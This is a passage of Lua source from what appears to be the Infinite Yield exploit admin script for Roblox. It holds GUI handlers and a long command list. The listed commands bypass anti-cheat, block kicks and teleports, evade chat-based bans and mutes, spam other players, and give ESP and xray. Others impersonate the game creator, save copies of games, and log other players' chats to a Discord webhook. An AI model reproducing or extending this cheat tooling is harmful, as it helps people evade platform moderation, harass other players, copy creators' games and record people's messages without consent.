							nameFile()
						else
							writefileCooldown(placeName..' Chat Logs ('..fileext..').txt', writelogsFile)
						end
					end
					nameFile()
					notify('Chat Logs','Saved chat logs to the workspace folder within your exploit folder.')
				end
			else
				notify('Chat Logs','Your exploit does not support write file. You cannot save chat logs.')
			end
		end)
	
		if isLegacyChat then
			for _, plr in pairs(Players:GetPlayers()) do
				ChatLog(plr)
			end
		end
	
		Players.PlayerRemoving:Connect(function(player)
			if ESPenabled or CHMSenabled or COREGUI:FindFirstChild(player.Name..'_LC') then
				for i,v in pairs(COREGUI:GetChildren()) do
					if v.Name == player.Name..'_ESP' or v.Name == player.Name..'_LC' or v.Name == player.Name..'_CHMS' then
						v:Destroy()
					end
				end
			end
			if viewing ~= nil and player == viewing then
				workspace.CurrentCamera.CameraSubject = Players.LocalPlayer.Character
				viewing = nil
				if viewDied then
					viewDied:Disconnect()
					viewChanged:Disconnect()
				end
				notify('Spectate','View turned off (player left)')
			end
			eventEditor.FireEvent("OnLeave", player.Name)
		end)
	
		Exit.MouseButton1Down:Connect(function()
			logs:TweenPosition(UDim2.new(0, 0, 1, 10), "InOut", "Quart", 0.3, true, nil)
		end)
	
		Hide.MouseButton1Down:Connect(function()
			if logs.Position ~= UDim2.new(0, 0, 1, -20) then
				logs:TweenPosition(UDim2.new(0, 0, 1, -20), "InOut", "Quart", 0.3, true, nil)
			else
				logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
			end
		end)
	
		EventBind.MouseButton1Click:Connect(function()
			eventEditor.Frame:TweenPosition(UDim2.new(0.5,-175,0.5,-101), "InOut", "Quart", 0.5, true, nil)
		end)
	
		Keybinds.MouseButton1Click:Connect(function()
			KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
			wait(0.5)
			SettingsHolder.Visible = false
		end)
	
		Close.MouseButton1Click:Connect(function()
			SettingsHolder.Visible = true
			KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
		end)
	
		Keybinds.MouseButton1Click:Connect(function()
			KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
			wait(0.5)
			SettingsHolder.Visible = false
		end)
	
		Add.MouseButton1Click:Connect(function()
			KeybindEditor:TweenPosition(UDim2.new(0.5, -180, 0, 260), "InOut", "Quart", 0.5, true, nil)
		end)
	
		Delete.MouseButton1Click:Connect(function()
			binds = {}
			refreshbinds()
			updatesaves()
			notify('Keybinds Updated','Removed all keybinds')
		end)
	
		Close_2.MouseButton1Click:Connect(function()
			SettingsHolder.Visible = true
			AliasesFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
		end)
	
		Aliases.MouseButton1Click:Connect(function()
			AliasesFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
			wait(0.5)
			SettingsHolder.Visible = false
		end)
	
		Close_3.MouseButton1Click:Connect(function()
			SettingsHolder.Visible = true
			PositionsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
		end)
	
		Positions.MouseButton1Click:Connect(function()
			PositionsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
			wait(0.5)
			SettingsHolder.Visible = false
		end)
	
		local selectionBox = Instance.new("SelectionBox")
		selectionBox.Name = randomString()
		selectionBox.Color3 = Color3.new(255,255,255)
		selectionBox.Adornee = nil
		selectionBox.Parent = PARENT
	
		local selected = Instance.new("SelectionBox")
		selected.Name = randomString()
		selected.Color3 = Color3.new(0,166,0)
		selected.Adornee = nil
		selected.Parent = PARENT
	
		local ActivateHighlight = nil
		local ClickSelect = nil
		function selectPart()
			ToPartFrame:TweenPosition(UDim2.new(0.5, -180, 0, 335), "InOut", "Quart", 0.5, true, nil)
			local function HighlightPart()
				if selected.Adornee ~= IYMouse.Target then
					selectionBox.Adornee = IYMouse.Target
				else
					selectionBox.Adornee = nil
				end
			end
			ActivateHighlight = IYMouse.Move:Connect(HighlightPart)
			local function SelectPart()
				if IYMouse.Target ~= nil then
					selected.Adornee = IYMouse.Target
					Path.Text = getHierarchy(IYMouse.Target)
				end
			end
			ClickSelect = IYMouse.Button1Down:Connect(SelectPart)
		end
	
		Part.MouseButton1Click:Connect(function()
			selectPart()
		end)
	
		Exit_4.MouseButton1Click:Connect(function()
			ToPartFrame:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
			if ActivateHighlight then
				ActivateHighlight:Disconnect()
			end
			if ClickSelect then
				ClickSelect:Disconnect()
			end
			selectionBox.Adornee = nil
			selected.Adornee = nil
			Path.Text = ""
		end)
	
		CopyPath.MouseButton1Click:Connect(function()
			if Path.Text ~= "" then
				toClipboard(Path.Text)
			else
				notify('Copy Path','Select a part to copy its path')
			end
		end)
	
		ChoosePart.MouseButton1Click:Connect(function()
			if Path.Text ~= "" then
				local tpNameExt = ''
				local function handleWpNames()
					local FoundDupe = false
					for i,v in pairs(pWayPoints) do
						if v.NAME:lower() == selected.Adornee.Name:lower()..tpNameExt then
							FoundDupe = true
						end
					end
					if not FoundDupe then
						notify('Modified Waypoints',"Created waypoint: "..selected.Adornee.Name..tpNameExt)
						pWayPoints[#pWayPoints + 1] = {NAME = selected.Adornee.Name..tpNameExt, COORD = {selected.Adornee}}
					else
						if isNumber(tpNameExt) then
							tpNameExt = tpNameExt+1
						else
							tpNameExt = 1
						end
						handleWpNames()
					end
				end
				handleWpNames()
				refreshwaypoints()
			else
				notify('Part Selection','Select a part first')
			end
		end)
	
		cmds={}
		customAlias = {}
		Delete_3.MouseButton1Click:Connect(function()
			customAlias = {}
			aliases = {}
			notify('Aliases Modified','Removed all aliases')
			updatesaves()
			refreshaliases()
		end)
	
		PrefixBox:GetPropertyChangedSignal("Text"):Connect(function()
			prefix = PrefixBox.Text
			Cmdbar.PlaceholderText = "Command Bar ("..prefix..")"
			updatesaves()
		end)
	
		function CamViewport()
			if workspace.CurrentCamera then
				return workspace.CurrentCamera.ViewportSize.X
			end
		end
	
		function UpdateToViewport()
			if Holder.Position.X.Offset < -CamViewport() then
				Holder:TweenPosition(UDim2.new(1, -CamViewport(), Holder.Position.Y.Scale, Holder.Position.Y.Offset), "InOut", "Quart", 0.04, true, nil)
				Notification:TweenPosition(UDim2.new(1, -CamViewport() + 250, Notification.Position.Y.Scale, Notification.Position.Y.Offset), "InOut", "Quart", 0.04, true, nil)
			end
		end
		CameraChanged = workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(UpdateToViewport)
	
		function updateCamera(child, parent)
			if parent ~= workspace then
				CamMoved:Disconnect()
				CameraChanged:Disconnect()
				repeat wait() until workspace.CurrentCamera
				CameraChanged = workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(UpdateToViewport)
				CamMoved = workspace.CurrentCamera.AncestryChanged:Connect(updateCamera)
			end
		end
		CamMoved = workspace.CurrentCamera.AncestryChanged:Connect(updateCamera)
	
		function dragMain(dragpoint,gui)
			task.spawn(function()
				local dragging
				local dragInput
				local dragStart = Vector3.new(0,0,0)
				local startPos
				local function update(input)
					local pos = -250
					local delta = input.Position - dragStart
					if startPos.X.Offset + delta.X <= -500 then
						local Position = UDim2.new(1, -250, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
						TweenService:Create(Notification, TweenInfo.new(.20), {Position = Position}):Play()
						pos = 250
					else
						local Position = UDim2.new(1, -500, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
						TweenService:Create(Notification, TweenInfo.new(.20), {Position = Position}):Play()
						pos = -250
					end
					if startPos.X.Offset + delta.X <= -250 and -CamViewport() <= startPos.X.Offset + delta.X then
						local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, gui.Position.Y.Scale, gui.Position.Y.Offset)
						TweenService:Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
						local Position2 = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X + pos, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
						TweenService:Create(Notification, TweenInfo.new(.20), {Position = Position2}):Play()
					elseif startPos.X.Offset + delta.X > -500 then
						local Position = UDim2.new(1, -250, gui.Position.Y.Scale, gui.Position.Y.Offset)
						TweenService:Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
					elseif -CamViewport() > startPos.X.Offset + delta.X then
						gui:TweenPosition(UDim2.new(1, -CamViewport(), gui.Position.Y.Scale, gui.Position.Y.Offset), "InOut", "Quart", 0.04, true, nil)
						local Position = UDim2.new(1, -CamViewport(), gui.Position.Y.Scale, gui.Position.Y.Offset)
						TweenService:Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
						local Position2 = UDim2.new(1, -CamViewport() + 250, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
						TweenService:Create(Notification, TweenInfo.new(.20), {Position = Position2}):Play()
					end
				end
				dragpoint.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
						dragging = true
						dragStart = input.Position
						startPos = gui.Position
	
						input.Changed:Connect(function()
							if input.UserInputState == Enum.UserInputState.End then
								dragging = false
							end
						end)
					end
				end)
				dragpoint.InputChanged:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
						dragInput = input
					end
				end)
				UserInputService.InputChanged:Connect(function(input)
					if input == dragInput and dragging then
						update(input)
					end
				end)
			end)
		end
	
		dragMain(Title,Holder)
	
		Match = function(name,str)
			str = str:gsub("%W", "%%%1")
			return name:lower():find(str:lower()) and true
		end
	
		local canvasPos = Vector2.new(0,0)
		local topCommand = nil
		IndexContents = function(str,bool,cmdbar,Ianim)
			CMDsF.CanvasPosition = Vector2.new(0,0)
			local SizeY = 0
			local indexnum = 0
			local frame = CMDsF
			topCommand = nil
			local chunks = {}
			if str:sub(#str,#str) == "\\" then str = "" end
			for w in string.gmatch(str,"[^\\]+") do
				table.insert(chunks,w)
			end
			if #chunks > 0 then str = chunks[#chunks] end
			if str:sub(1,1) == "!" then str = str:sub(2) end
			for i,v in next, frame:GetChildren() do
				if v:IsA("TextButton") then
					if bool then
						if Match(v.Text,str) then
							indexnum = indexnum + 1
							v.Visible = true
							if topCommand == nil then
								topCommand = v.Text
							end
						else
							v.Visible = false
						end
					else
						v.Visible = true
						if topCommand == nil then
							topCommand = v.Text
						end
					end
				end
			end
			frame.CanvasSize = UDim2.new(0,0,0,cmdListLayout.AbsoluteContentSize.Y)
			if not Ianim then
				if indexnum == 0 or string.find(str, " ") then
					if not cmdbar then
						minimizeHolder()
					elseif cmdbar then
						cmdbarHolder()
					end
				else
					maximizeHolder()
				end
			else
				minimizeHolder()
			end
		end
	
		task.spawn(function()
			if not isLegacyChat then return end
			local chatbox
			local success, result = pcall(function() chatbox = PlayerGui:WaitForChild("Chat").Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar end)
			if success then
				local function chatboxFocused()
					canvasPos = CMDsF.CanvasPosition
				end
				local chatboxFocusedC = chatbox.Focused:Connect(chatboxFocused)
	
				local function Index()
					if chatbox.Text:lower():sub(1,1) == prefix then
						if SettingsOpen == true then
							wait(0.2)
							CMDsF.Visible = true
							Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.2, true, nil)
						end
						IndexContents(PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar.Text:lower():sub(2),true)
					else
						minimizeHolder()
						if SettingsOpen == true then
							wait(0.2)
							Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.2, true, nil)
							CMDsF.Visible = false
						end
					end
				end
				local chatboxFunc = chatbox:GetPropertyChangedSignal("Text"):Connect(Index)
	
				local function chatboxFocusLost(enterpressed)
					if not enterpressed or chatbox.Text:lower():sub(1,1) ~= prefix then
						IndexContents('',true)
					end
					CMDsF.CanvasPosition = canvasPos
					minimizeHolder()
				end
				local chatboxFocusLostC = chatbox.FocusLost:Connect(chatboxFocusLost)
	
				PlayerGui:WaitForChild("Chat").Frame.ChatBarParentFrame.ChildAdded:Connect(function(newbar)
					wait()
					if newbar:FindFirstChild('BoxFrame') then
						chatbox = PlayerGui:WaitForChild("Chat").Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar
						if chatboxFocusedC then chatboxFocusedC:Disconnect() end
						chatboxFocusedC = chatbox.Focused:Connect(chatboxFocused)
						if chatboxFunc then chatboxFunc:Disconnect() end
						chatboxFunc = chatbox:GetPropertyChangedSignal("Text"):Connect(Index)
						if chatboxFocusLostC then chatboxFocusLostC:Disconnect() end
						chatboxFocusLostC = chatbox.FocusLost:Connect(chatboxFocusLost)
					end
				end)
				--else
				--print('Custom chat detected. Will not provide suggestions for commands typed in the chat.')
			end
		end)
	
		function autoComplete(str,curText)
			local endingChar = {"[", "/", "(", " "}
			local stop = 0
			for i=1,#str do
				local c = str:sub(i,i)
				if table.find(endingChar, c) then
					stop = i
					break
				end
			end
			curText = curText or Cmdbar.Text
			local subPos = 0
			local pos = 1
			local findRes = string.find(curText,"\\",pos)
			while findRes do
				subPos = findRes
				pos = findRes+1
				findRes = string.find(curText,"\\",pos)
			end
			if curText:sub(subPos+1,subPos+1) == "!" then subPos = subPos + 1 end
			Cmdbar.Text = curText:sub(1,subPos) .. str:sub(1, stop - 1)..' '
			RunService.RenderStepped:Wait()
			Cmdbar.Text = Cmdbar.Text:gsub( '\t', '' )
			Cmdbar.CursorPosition = #Cmdbar.Text+1--1020
		end
	
		CMDs = {}
		CMDs[#CMDs + 1] = {NAME = 'discord / support / help', DESC = 'Invite to the Infinite Yield support server.'}
		CMDs[#CMDs + 1] = {NAME = 'guiscale [number]', DESC = 'Changes the size of the gui. [number] accepts both decimals and whole numbers. Min is 0.4 and Max is 2'}
		CMDs[#CMDs + 1] = {NAME = 'console', DESC = 'Loads Roblox console'}
		CMDs[#CMDs + 1] = {NAME = 'oldconsole', DESC = 'Loads old Roblox console'}
		CMDs[#CMDs + 1] = {NAME = 'explorer / dex', DESC = 'Opens DEX by Moon'}
		CMDs[#CMDs + 1] = {NAME = 'olddex / odex', DESC = 'Opens Old DEX by Moon'}
		CMDs[#CMDs + 1] = {NAME = 'remotespy / rspy', DESC = 'Opens Simple Spy V3'}
		CMDs[#CMDs + 1] = {NAME = 'audiologger / alogger', DESC = 'Opens Edges audio logger'}
		CMDs[#CMDs + 1] = {NAME = 'serverinfo / info', DESC = 'Gives you info about the server'}
		CMDs[#CMDs + 1] = {NAME = 'jobid', DESC = 'Copies the games JobId to your clipboard'}
		CMDs[#CMDs + 1] = {NAME = 'notifyjobid', DESC = 'Notifies you the games JobId'}
		CMDs[#CMDs + 1] = {NAME = 'rejoin / rj', DESC = 'Makes you rejoin the game'}
		CMDs[#CMDs + 1] = {NAME = 'autorejoin / autorj', DESC = 'Automatically rejoins the server if you get kicked/disconnected'}
		CMDs[#CMDs + 1] = {NAME = 'serverhop / shop', DESC = 'Teleports you to a different server'}
		CMDs[#CMDs + 1] = {NAME = 'gameteleport / gametp [place ID]', DESC = 'Joins a game by ID'}
		CMDs[#CMDs + 1] = {NAME = 'antiidle / antiafk', DESC = 'Prevents the game from kicking you for being idle/afk'}
		CMDs[#CMDs + 1] = {NAME = 'datalimit [num]', DESC = 'Set outgoing KBPS limit'}
		CMDs[#CMDs + 1] = {NAME = 'replicationlag / backtrack [num]', DESC = 'Set IncomingReplicationLag'}
		CMDs[#CMDs + 1] = {NAME = 'creatorid / creator', DESC = 'Notifies you the creators ID'}
		CMDs[#CMDs + 1] = {NAME = 'copycreatorid / copycreator', DESC = 'Copies the creators ID to your clipboard'}
		CMDs[#CMDs + 1] = {NAME = 'setcreatorid / setcreator', DESC = 'Sets your userid to the creators ID'}
		CMDs[#CMDs + 1] = {NAME = 'noprompts', DESC = 'Prevents the game from showing you purchase/premium prompts'}
		CMDs[#CMDs + 1] = {NAME = 'showprompts', DESC = 'Allows the game to show purchase/premium prompts again'}
		CMDs[#CMDs + 1] = {NAME = 'enable [inventory/playerlist/chat/reset/emotes/all]', DESC = 'Toggles visibility of coregui items'}
		CMDs[#CMDs + 1] = {NAME = 'disable [inventory/playerlist/chat/reset/emotes/all]', DESC = 'Toggles visibility of coregui items'}
		CMDs[#CMDs + 1] = {NAME = 'showguis', DESC = 'Shows any invisible GUIs'}
		CMDs[#CMDs + 1] = {NAME = 'unshowguis', DESC = 'Undoes showguis'}
		CMDs[#CMDs + 1] = {NAME = 'hideguis', DESC = 'Hides any GUIs in PlayerGui'}
		CMDs[#CMDs + 1] = {NAME = 'unhideguis', DESC = 'Undoes hideguis'}
		CMDs[#CMDs + 1] = {NAME = 'guidelete', DESC = 'Enables backspace to delete GUI'}
		CMDs[#CMDs + 1] = {NAME = 'unguidelete / noguidelete', DESC = 'Disables guidelete'}
		CMDs[#CMDs + 1] = {NAME = 'hideiy', DESC = 'Hides the main IY GUI'}
		CMDs[#CMDs + 1] = {NAME = 'showiy / unhideiy', DESC = 'Shows IY again'}
		CMDs[#CMDs + 1] = {NAME = 'keepiy', DESC = 'Auto execute IY when you teleport through servers'}
		CMDs[#CMDs + 1] = {NAME = 'unkeepiy', DESC = 'Disable keepiy'}
		CMDs[#CMDs + 1] = {NAME = 'togglekeepiy', DESC = 'Toggles keepiy'}
		CMDs[#CMDs + 1] = {NAME = 'savegame / saveplace', DESC = 'Uses saveinstance to save the game'}
		CMDs[#CMDs + 1] = {NAME = 'clearerror', DESC = 'Clears the annoying box and blur when a game kicks you'}
		CMDs[#CMDs + 1] = {NAME = 'clientantikick / antikick (CLIENT)', DESC = 'Prevents localscripts from kicking you'}
		CMDs[#CMDs + 1] = {NAME = 'clientantiteleport / antiteleport (CLIENT)', DESC = 'Prevents localscripts from teleporting you'}
		CMDs[#CMDs + 1] = {NAME = 'allowrejoin / allowrj [true/false] (CLIENT)', DESC = 'Changes if antiteleport allows you to rejoin or not'}
		CMDs[#CMDs + 1] = {NAME = 'cancelteleport / canceltp', DESC = 'Cancels teleports in progress'}
		CMDs[#CMDs + 1] = {NAME = 'volume / vol [0-10]', DESC = 'Adjusts your game volume on a scale of 0 to 10'}
		CMDs[#CMDs + 1] = {NAME = 'antilag / boostfps / lowgraphics', DESC = 'Lowers game quality to boost FPS'}
		CMDs[#CMDs + 1] = {NAME = 'record / rec', DESC = 'Starts Roblox recorder'}
		CMDs[#CMDs + 1] = {NAME = 'screenshot / scrnshot', DESC = 'Takes a screenshot'}
		CMDs[#CMDs + 1] = {NAME = 'togglefullscreen / togglefs', DESC = 'Toggles fullscreen'}
		CMDs[#CMDs + 1] = {NAME = 'notify [text]', DESC = 'Sends you a notification with the provided text'}
		CMDs[#CMDs + 1] = {NAME = 'lastcommand / lastcmd', DESC = 'Executes the previous command used'}
		CMDs[#CMDs + 1] = {NAME = 'exit', DESC = 'Kills roblox process'}
		CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
		CMDs[#CMDs + 1] = {NAME = 'noclip', DESC = 'Go through objects'}
		CMDs[#CMDs + 1] = {NAME = 'unnoclip / clip', DESC = 'Disables noclip'}
		CMDs[#CMDs + 1] = {NAME = 'fly [speed]', DESC = 'Makes you fly'}
		CMDs[#CMDs + 1] = {NAME = 'unfly', DESC = 'Disables fly'}
		CMDs[#CMDs + 1] = {NAME = 'flyspeed [num]', DESC = 'Set fly speed (default is 20)'}
		CMDs[#CMDs + 1] = {NAME = 'vehiclefly / vfly [speed]', DESC = 'Makes you fly in a vehicle'}
		CMDs[#CMDs + 1] = {NAME = 'unvehiclefly / unvfly', DESC = 'Disables vehicle fly'}
		CMDs[#CMDs + 1] = {NAME = 'vehicleflyspeed  / vflyspeed [num]', DESC = 'Set vehicle fly speed'}
		CMDs[#CMDs + 1] = {NAME = 'cframefly / cfly [speed]', DESC = 'Makes you fly, bypassing some anti cheats (works on mobile)'}
		CMDs[#CMDs + 1] = {NAME = 'uncframefly / uncfly', DESC = 'Disables cfly'}
		CMDs[#CMDs + 1] = {NAME = 'cframeflyspeed  / cflyspeed [num]', DESC = 'Sets cfly speed'}
		CMDs[#CMDs + 1] = {NAME = 'qefly [true / false]', DESC = 'Enables or disables the Q and E hotkeys for fly'}
		CMDs[#CMDs + 1] = {NAME = 'vehiclenoclip / vnoclip', DESC = 'Turns off vehicle collision'}
		CMDs[#CMDs + 1] = {NAME = 'vehicleclip / vclip / unvnoclip', DESC = 'Enables vehicle collision'}
		CMDs[#CMDs + 1] = {NAME = 'float /  platform', DESC = 'Spawns a platform beneath you causing you to float'}
		CMDs[#CMDs + 1] = {NAME = 'unfloat / noplatform', DESC = 'Removes the platform'}
		CMDs[#CMDs + 1] = {NAME = 'swim', DESC = 'Allows you to swim in the air'}
		CMDs[#CMDs + 1] = {NAME = 'unswim / noswim', DESC = 'Stops you from swimming everywhere'}
		CMDs[#CMDs + 1] = {NAME = 'toggleswim', DESC = 'Toggles swimming'}
		CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
		CMDs[#CMDs + 1] = {NAME = 'setwaypoint / swp [name]', DESC = 'Sets a waypoint at your position'}
		CMDs[#CMDs + 1] = {NAME = 'waypointpos / wpp [name] [X Y Z]', DESC = 'Sets a waypoint with specified coordinates'}
		CMDs[#CMDs + 1] = {NAME = 'waypoints', DESC = 'Shows a list of currently active waypoints'}
		CMDs[#CMDs + 1] = {NAME = 'showwaypoints / showwp', DESC = 'Shows all currently set waypoints'}
		CMDs[#CMDs + 1] = {NAME = 'hidewaypoints / hidewp', DESC = 'Hides shown waypoints'}
		CMDs[#CMDs + 1] = {NAME = 'waypoint / wp [name]', DESC = 'Teleports player to a waypoint'}
		CMDs[#CMDs + 1] = {NAME = 'tweenwaypoint / twp [name]', DESC = 'Tweens player to a waypoint'}
		CMDs[#CMDs + 1] = {NAME = 'walktowaypoint / wtwp [name]', DESC = 'Walks player to a waypoint'}
		CMDs[#CMDs + 1] = {NAME = 'deletewaypoint / dwp [name]', DESC = 'Deletes a waypoint'}
		CMDs[#CMDs + 1] = {NAME = 'clearwaypoints / cwp', DESC = 'Clears all waypoints'}
		CMDs[#CMDs + 1] = {NAME = 'cleargamewaypoints / cgamewp', DESC = 'Clears all waypoints for the game you are in'}
		CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
		CMDs[#CMDs + 1] = {NAME = 'goto [player]', DESC = 'Go to a player'}
		CMDs[#CMDs + 1] = {NAME = 'tweengoto / tgoto [player]', DESC = 'Tween to a player (bypasses some anti cheats)'}
		CMDs[#CMDs + 1] = {NAME = 'tweenspeed / tspeed [num]', DESC = 'Sets how fast all tween commands go (default is 1)'}
		CMDs[#CMDs + 1] = {NAME = 'vehiclegoto / vgoto [player]', DESC = 'Go to a player while in a vehicle'}
		CMDs[#CMDs + 1] = {NAME = 'loopgoto [player] [distance] [delay]', DESC = 'Loop teleport to a player'}
		CMDs[#CMDs + 1] = {NAME = 'unloopgoto', DESC = 'Stops teleporting you to a player'}
		CMDs[#CMDs + 1] = {NAME = 'pulsetp / ptp [player] [seconds]', DESC = 'Teleports you to a player for a specified amount of time'}
		CMDs[#CMDs + 1] = {NAME = 'clientbring / cbring [player] (CLIENT)', DESC = 'Bring a player'}
		CMDs[#CMDs + 1] = {NAME = 'loopbring [player] [distance] [delay] (CLIENT)', DESC = 'Loop brings a player to you (useful for killing)'}
		CMDs[#CMDs + 1] = {NAME = 'unloopbring [player]', DESC = 'Undoes loopbring'}
		CMDs[#CMDs + 1] = {NAME = 'freeze / fr [player] (CLIENT)', DESC = 'Freezes a player'}
		CMDs[#CMDs + 1] = {NAME = 'freezeanims', DESC = 'Freezes your animations / pauses your animations - Does not work on default animations'}
		CMDs[#CMDs + 1] = {NAME = 'unfreezeanims', DESC = 'Unfreezes your animations / plays your animations'}
		CMDs[#CMDs + 1] = {NAME = 'thaw / unfr [player] (CLIENT)', DESC = 'Unfreezes a player'}
		CMDs[#CMDs + 1] = {NAME = 'tpposition / tppos [X Y Z]', DESC = 'Teleports you to certain coordinates'}
		CMDs[#CMDs + 1] = {NAME = 'tweentpposition / ttppos [X Y Z]', DESC = 'Tween to coordinates (bypasses some anti cheats)'}
		CMDs[#CMDs + 1] = {NAME = 'offset [X Y Z]', DESC = 'Offsets you by certain coordinates'}
		CMDs[#CMDs + 1] = {NAME = 'tweenoffset / toffset [X Y Z]', DESC = 'Tween offset (bypasses some anti cheats)'}
		CMDs[#CMDs + 1] = {NAME = 'notifyposition / notifypos [player]', DESC = 'Notifies you the coordinates of a character'}
		CMDs[#CMDs + 1] = {NAME = 'copyposition / copypos [player]', DESC = 'Copies the coordinates of a character to your clipboard'}
		CMDs[#CMDs + 1] = {NAME = 'walktoposition / walktopos [X Y Z]', DESC = 'Makes you walk to a coordinate'}
		CMDs[#CMDs + 1] = {NAME = 'spawnpoint / spawn [delay]', DESC = 'Sets a position where you will spawn'}
		CMDs[#CMDs + 1] = {NAME = 'nospawnpoint / nospawn', DESC = 'Removes your custom spawn point'}
		CMDs[#CMDs + 1] = {NAME = 'flashback / diedtp', DESC = 'Teleports you to where you last died'}
		CMDs[#CMDs + 1] = {NAME = 'walltp', DESC = 'Teleports you above/over any wall you run into'}
		CMDs[#CMDs + 1] = {NAME = 'nowalltp / unwalltp', DESC = 'Disables walltp'}
		CMDs[#CMDs + 1] = {NAME = 'teleporttool / tptool', DESC = 'Gives you a teleport tool'}
		CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
		CMDs[#CMDs + 1] = {NAME = 'logs', DESC = 'Opens the logs GUI'}
		CMDs[#CMDs + 1] = {NAME = 'chatlogs / clogs', DESC = 'Log what people say or whisper'}
		CMDs[#CMDs + 1] = {NAME = 'joinlogs / jlogs', DESC = 'Log when people join'}
		CMDs[#CMDs + 1] = {NAME = 'chatlogswebhook / logswebhook [url]', DESC = 'Set a discord webhook for chatlogs to go to (provide no url to disable this)'}
		CMDs[#CMDs + 1] = {NAME = 'antichatlogs / antichatlogger', DESC = 'Prevents Roblox from banning you for your silly chat messages (game needs the legacy chat)'}
		CMDs[#CMDs + 1] = {NAME = 'chat / say [text]', DESC = 'Makes you chat a string (possible mute bypass)'}
		CMDs[#CMDs + 1] = {NAME = 'spam [text]', DESC = 'Makes you spam the chat'}
		CMDs[#CMDs + 1] = {NAME = 'unspam', DESC = 'Turns off spam'}
		CMDs[#CMDs + 1] = {NAME = 'whisper / pm [player] [text]', DESC = 'Makes you whisper a string to someone (possible mute bypass)'}
		CMDs[#CMDs + 1] = {NAME = 'pmspam [player] [text]', DESC = 'Makes you spam a players whispers'}
		CMDs[#CMDs + 1] = {NAME = 'unpmspam [player]', DESC = 'Turns off pm spam'}
		CMDs[#CMDs + 1] = {NAME = 'spamspeed [num]', DESC = 'How quickly you spam (default is 1)'}
		CMDs[#CMDs + 1] = {NAME = 'bubblechat (CLIENT)', DESC = 'Enables bubble chat for your client'}
		CMDs[#CMDs + 1] = {NAME = 'unbubblechat / nobubblechat', DESC = 'Disables the bubblechat command'}
		CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
		CMDs[#CMDs + 1] = {NAME = 'esp', DESC = 'View all players and their status'}
		CMDs[#CMDs + 1] = {NAME = 'espteam', DESC = 'ESP but teammates are green and bad guys are red'}
		CMDs[#CMDs + 1] = {NAME = 'noesp / unesp / unespteam', DESC = 'Removes ESP'}
		CMDs[#CMDs + 1] = {NAME = 'esptransparency [number]', DESC = 'Changes the transparency of ESP related commands'}
		CMDs[#CMDs + 1] = {NAME = 'partesp [part name]', DESC = 'Highlights a part'}
		CMDs[#CMDs + 1] = {NAME = 'unpartesp / nopartesp [part name]', DESC = 'removes partesp'}
		CMDs[#CMDs + 1] = {NAME = 'chams', DESC = 'ESP but without text in the way'}
		CMDs[#CMDs + 1] = {NAME = 'nochams / unchams', DESC = 'Removes chams'}
		CMDs[#CMDs + 1] = {NAME = 'locate [player]', DESC = 'View a single player and their status'}
		CMDs[#CMDs + 1] = {NAME = 'unlocate / nolocate [player]', DESC = 'Removes locate'}
		CMDs[#CMDs + 1] = {NAME = 'xray', DESC = 'Makes all parts in workspace transparent'}
		CMDs[#CMDs + 1] = {NAME = 'unxray / noxray', DESC = 'Restores transparency to all parts in workspace'}
		CMDs[#CMDs + 1] = {NAME = 'loopxray', DESC = 'Makes all parts in workspace transparent but looped'}
		CMDs[#CMDs + 1] = {NAME = 'unloopxray', DESC = 'Unloops xray'}
		CMDs[#CMDs + 1] = {NAME = 'togglexray', DESC = 'Toggles xray'}
		CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
		CMDs[#CMDs + 1] = {NAME = 'spectate / view [player]', DESC = 'View a player'}
		CMDs[#CMDs + 1] = {NAME = 'viewpart / viewp [part name]', DESC = 'View a part'}
		CMDs[#CMDs + 1] = {NAME = 'unspectate / unview', DESC = 'Stops viewing player'}
		CMDs[#CMDs + 1] = {NAME = 'freecam / fc', DESC = 'Allows you to freely move camera around the game'}
		CMDs[#CMDs + 1] = {NAME = 'freecampos / fcpos [X Y Z]', DESC = 'Moves / opens freecam in a certain position'}
		CMDs[#CMDs + 1] = {NAME = 'freecamwaypoint / fcwp [name]', DESC = 'Moves / opens freecam to a waypoint'}
		CMDs[#CMDs + 1] = {NAME = 'freecamgoto / fcgoto / fctp [player]', DESC = 'Moves / opens freecam to a player'}
		CMDs[#CMDs + 1] = {NAME = 'unfreecam / unfc', DESC = 'Disables freecam'}
		CMDs[#CMDs + 1] = {NAME = 'freecamspeed / fcspeed [num]', DESC = 'Adjusts freecam speed (default is 1)'}
